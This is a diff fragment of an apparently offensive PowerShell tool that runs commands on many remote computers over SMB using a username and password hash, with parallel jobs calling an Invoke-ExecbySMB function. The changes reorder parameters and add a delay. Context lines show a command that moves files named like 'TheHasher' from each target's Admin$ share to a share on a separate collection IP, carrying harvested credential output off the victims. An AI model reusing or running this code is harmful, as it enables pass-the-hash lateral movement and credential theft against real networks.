@@ -3814,8 +3814,8 @@ Param (
     $Command,
     $ShareIP,
     $BackChannel,
-    $Domain,
-    $InvokeSMB
+    $InvokeSMB,
+    $Domain
     )
 
 
@@ -3844,6 +3844,7 @@ Param (
                         {
                         try
                             {
+                            Start-Sleep -Seconds 20
                             [string]$STRCommand2 = {Start-Process PowerShell -ArgumentList "(Move-Item -Path (Get-ChildItem  -Path ('\\%TARGET%\Admin$\') -Filter '*TheHasher*').fullname -Destination ('\\%IP%\Exchange$'))"}
                             $STRCommand2 = $STRCommand2.Replace("%IP%",$ShareIP)
                             $STRCommand2 = $STRCommand2.Replace("%TARGET%",$ComputerName)
@@ -4073,7 +4074,7 @@ $jobs = @()
 Write-Verbose -Message ("Jobs initilized")
 foreach($Computer in $Computers) 
 {
-    $job = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Username).AddArgument($Hash).AddArgument($Command).AddArgument($ShareIPAdress).AddArgument($BackChannel).AddArgument($UserDomain).AddArgument((Get-Item function:Invoke-ExecbySMB).Definition)
+    $job = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Username).AddArgument($Hash).AddArgument($Command).AddArgument($ShareIPAdress).AddArgument($BackChannel).AddArgument((Get-Item function:Invoke-ExecbySMB).Definition).AddArgument($UserDomain)
     $job.RunspacePool = $runSpacePool
     $jobs += New-Object PSObject -Property @{
         RunNum = $Group
